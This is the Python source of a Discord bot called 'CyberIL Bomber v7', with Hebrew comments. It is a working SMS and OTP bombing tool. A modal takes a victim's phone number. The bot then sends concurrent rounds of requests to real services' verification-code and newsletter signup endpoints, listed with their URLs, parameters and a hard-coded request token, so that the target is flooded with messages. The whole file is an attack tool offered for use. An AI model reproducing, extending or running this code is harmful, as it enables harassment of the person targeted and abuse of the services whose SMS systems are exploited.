import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import random
import json

# ==================== CONFIG ====================
TOKEN = os.getenv("BOT_TOKEN")
intents = discord.Intents.default()
intents.message_content = True 

# ==================== THE ULTIMATE API LIST ====================
# שילוב ה-APIs הקודמים עם ה-APIs החדשים ששלחת (Subtext, Text4Baby, Misen)
ALL_APIs = [
    # --- שירותים חדשים מהקוד האחרון ---
    {
        "name": "Text4Baby",
        "url": "https://text4baby.org/SignUp/SaveSignUpDetails",
        "method": "POST",
        "json": {
            "CustomerType": {"Selected": "false", "Text": "I am pregnant", "Value": "1"},
            "RbAns": "No", "MenstrualDate": "03/15/2021", "ZipCode": "90001",
            "EmailId": "gen_email", # יטופל במנוע
            "MobileNo": "{{phone}}", "RbTermCondition": "true", "ReferringURL": "https://text4baby.org/SignUp"
        },
        "headers": {
            "__RequestVerificationToken": "-eKQgmyK1Fdmasr5TwV-dSl6foo_3pI3F_3j7AND4_EpCMus67jl2wNsny50cRwKEew05d2zSeuWyBJMat50iHKrPW4v2BtgkzqCGO5c5lvXi9qvbv442HtSL-UcZUjXKfSw8w2",
            "Origin": "https://text4baby.org",
            "Referer": "https://text4baby.org/SignUp"
        }
    },
    {
        "name": "Misen",
        "url": "https://api.postscript.io/subscribe/form",
        "method": "POST",
        "params": {"shop_id": "4641", "keyword_id": "29981", "phone": "{{phone}}"}
    },
    {
        "name": "WhioNewsletter",
        "url": "https://2save.mobi/go/site/offer/api/exec_signup.jsp?guid=E0AF89BC-AA29-0E74-E6E4-DFA40580602B",
        "method": "POST",
        "params": {
            "customerAccountID": 83, "phoneNumber": "{{phone}}", "password": "xxxxx", 
            "carrier": 78, "email": "SEDROPKIT-1d8@protonmail.com", "agreement": 1,
            "cb_484": 1, "cb_483": 1, "cb_482": 1, "cb_481": 1, "cb_480": 1
        }
    },
    
    # --- APIs נבחרים מהקובץ הקודם ---
    {"name": "Shopee", "url": "https://shopee.co.id/api/v4/otp/send_vcode", "method": "POST", "json": {"phone": "{{phone}}", "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1,2,3]}},
    {"name": "RupiahCepat", "url": "https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code", "method": "POST", "data": {"data": '{"mobile_no": "{{phone}}"}'}},
    {"name": "Adakami", "url": "https://api.adakami.id/adaKredit/pesan/kodeVerifikasi", "method": "POST", "json": {"ketik": 0, "nomor": "0{{phone_no_zero}}"}},
    {"name": "Matahari", "url": "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", "method": "POST", "json": {"otp_request": {"mobile_number": "{{phone}}", "mobile_country_code": "+62"}}},
    {"name": "ICQ", "url": "https://u.icq.net/api/v14/rapi/auth/sendCode", "method": "POST", "json": {"params": {"phone": "62{{phone_no_zero}}", "language": "en-US", "route": "sms", "application": "icq"}}},
    {"name": "Mishloha", "url": "https://www.mishloha.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}}
]

active_bombs = {}

# ==================== UTILS ====================
def generate_random_email():
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    prefix = "".join(random.choice(alpha) for _ in range(7))
    return f"{prefix}@SETOOLKITBY1d8.com"

# ==================== ENGINE ====================
async def run_attack(session, api, phone, user_id):
    if active_bombs.get(user_id) is False: return
    
    no_zero = phone[1:] if phone.startswith('0') else phone
    
    def fix_val(obj):
        if isinstance(obj, dict): return {k: fix_val(v) for k, v in obj.items()}
        if isinstance(obj, str): 
            val = obj.replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
            if val == "gen_email": return generate_random_email()
            return val
        return obj

    url = api["url"].replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
    payload = fix_val(api.get("json"))
    params = fix_val(api.get("params"))
    data = fix_val(api.get("data"))
    
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "application/json, text/plain, */*"
    }
    if api.get("headers"): headers.update(api["headers"])

    try:
        # טיפול מיוחד ב-Subtext (לולאה פנימית כפי שמופיעה בקוד שלך)
        if api["name"] == "Subtext":
            for camp_id in range(1, 20): # צמצמתי ל-20 כדי לא לקרוס
                sub_data = {"utf8": "✓", "campaign_subscription[campaign_id]": str(camp_id), "subscriber[phone_number]": phone}
                await session.post(api["url"], data=sub_data, timeout=5)
        else:
            async with session.request(api["method"], url, json=payload, data=data, params=params, headers=headers, timeout=10) as r:
                print(f"[{api['name']}] Status: {r.status}")
    except:
        pass

# ==================== DISCORD INTERFACE ====================
class BomberModal(discord.ui.Modal, title='🔥 Ultimate Nuke Spamer'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX')
    rounds = discord.ui.TextInput(label='סבבים', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        target = self.phone.value
        user_id = interaction.user.id
        active_bombs[user_id] = True
        
        await interaction.response.send_message(f"🚀 תקיפה משולבת החלה על {target}! (כולל Text4Baby ו-Subtext)", ephemeral=True)
        
        async with aiohttp.ClientSession() as session:
            for _ in range(int(self.rounds.value)):
                if active_bombs.get(user_id) is False: break
                tasks = [run_attack(session, api, target, user_id) for api in ALL_APIs]
                await asyncio.gather(*tasks)
                await asyncio.sleep(1)
        
        active_bombs.pop(user_id, None)

class ControlView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 START NUKE", style=discord.ButtonStyle.danger)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_bombs[interaction.user.id] = False
        await interaction.response.send_message("נעצר.", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self): super().__init__(command_prefix='!', intents=intents)
    async def setup_hook(self): await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    await interaction.response.send_message("CyberIL Bomber v7 - Ready", view=ControlView())

bot.run(TOKEN)
